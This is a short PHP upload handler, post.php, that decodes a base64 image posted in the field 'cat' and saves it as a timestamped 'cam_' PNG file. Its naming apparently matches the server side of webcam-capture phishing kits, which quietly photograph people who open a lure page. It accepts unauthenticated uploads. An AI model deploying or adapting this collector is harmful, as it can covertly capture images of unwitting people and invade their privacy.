<?php
// post.php
$date = date('Ymd_His');
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    $uploadDir = __DIR__ . '/uploads';
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    $filePath = $uploadDir . '/cam_' . $date . '.png';
    file_put_contents($filePath, $unencodedData);
}

// Respuesta vacía (JSON opcional)
echo json_encode(['status' => 'ok']);
exit();
?>
